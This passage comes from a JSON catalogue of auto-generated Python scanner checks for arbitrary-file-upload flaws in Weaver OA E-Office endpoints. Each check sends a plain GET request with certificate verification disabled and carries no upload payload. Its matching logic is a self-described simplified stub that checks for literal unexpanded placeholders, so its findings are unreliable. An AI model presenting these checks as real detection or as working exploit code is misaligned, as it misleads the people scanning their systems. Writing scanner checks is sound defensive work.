checker = NucleiCheck_weaver_lazyuploadify_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: weaver-lazyuploadify-file-upload\nName: OA E-Office LazyUploadify - Arbitrary File Upload\nSeverity: critical\nDescription: OA E-Office LazyUploadify is vulnerable to arbitrary file upload.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_weaver_lazyuploadify_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"weaver-lazyuploadify-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"OA E-Office LazyUploadify - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: contains(body_2, 'attachmentID') && contains(body_2, 'attachmentName') | mot(s) '{{md5(string)}}'\"\n\n        # Simple word matcher simulation\n        matchers = ['attachmentID', 'attachmentName', '{{md5(string)}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"OA E-Office LazyUploadify - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_weaver_lazyuploadify_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "weaver",
          "e-office",
          "intrusive",
          "rce",
          "file-upload",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_weaver_office_server_file_upload",
        "name": "OA E-Office OfficeServer.php Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "OA E-Office OfficeServer.php has an arbitrary file upload vulnerability. Attackers can obtain sensitive information on the server through the vulnerability.",
        "severity": "critical",
        "detection": "[AND] mot(s) '{{md5(string)}}' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{to_lower(rand_base(5))}}"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "weaver-office-server-file-upload"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: weaver-office-server-file-upload\nName: OA E-Office OfficeServer.php Arbitrary File Upload\nSeverity: critical\nDescription: OA E-Office OfficeServer.php has an arbitrary file upload vulnerability. Attackers can obtain sensitive information on the server through the vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_weaver_office_server_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"weaver-office-server-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"OA E-Office OfficeServer.php Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '{{md5(string)}}' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['{{md5(string)}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"OA E-Office OfficeServer.php Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_weaver_office_server_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: weaver-office-server-file-upload\nName: OA E-Office OfficeServer.php Arbitrary File Upload\nSeverity: critical\nDescription: OA E-Office OfficeServer.php has an arbitrary file upload vulnerability. Attackers can obtain sensitive information on the server through the vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_weaver_office_server_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"weaver-office-server-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"OA E-Office OfficeServer.php Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) '{{md5(string)}}' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['{{md5(string)}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"OA E-Office OfficeServer.php Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_weaver_office_server_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "weaver",
          "e-office",
          "oa",
          "rce",
          "intrusive",
          "fileupload",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_weaver_uploadify_file_upload",
        "name": "OA E-Office Uploadify - Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "OA E-Office Uploadify is vulnerable to arbitrary file upload.",
        "severity": "critical",
        "detection": "[AND] DSL: contains(body_2, 'imageSrc') && contains(body_2, 'height') | mot(s) '{{md5(string)}}'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "filename",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: filename",
            "default": "{{to_lower(rand_base(5))}}"
          },
          {
            "name": "string",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: string",
            "default": "weaver-uploadify-file-upload"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: weaver-uploadify-file-upload\nName: OA E-Office Uploadify - Arbitrary File Upload\nSeverity: critical\nDescription: OA E-Office Uploadify is vulnerable to arbitrary file upload.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_weaver_uploadify_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"weaver-uploadify-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"OA E-Office Uploadify - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: contains(body_2, 'imageSrc') && contains(body_2, 'height') | mot(s) '{{md5(string)}}'\"\n\n        # Simple word matcher simulation\n        matchers = ['imageSrc', 'height', '{{md5(string)}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"OA E-Office Uploadify - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_weaver_uploadify_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: weaver-uploadify-file-upload\nName: OA E-Office Uploadify - Arbitrary File Upload\nSeverity: critical\nDescription: OA E-Office Uploadify is vulnerable to arbitrary file upload.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_weaver_uploadify_file_upload:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"weaver-uploadify-file-upload\"\n    SEVERITY = \"critical\"\n    NAME = \"OA E-Office Uploadify - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] DSL: contains(body_2, 'imageSrc') && contains(body_2, 'height') | mot(s) '{{md5(string)}}'\"\n\n        # Simple word matcher simulation\n        matchers = ['imageSrc', 'height', '{{md5(string)}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"OA E-Office Uploadify - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_weaver_uploadify_file_upload(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "weaver",
          "e-office",
          "oa",
          "intrusive",
          "rce",
          "fileupload",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_weaver_uploadoperation_file_upload",
        "name": "Weaver OA Workrelate - Arbitary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "Ecology contains an arbitrary file upload vulnerability. An attacker can upload arbitrary files to the server, which in turn can be used to make the application execute file content as code, As a result, an attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.",
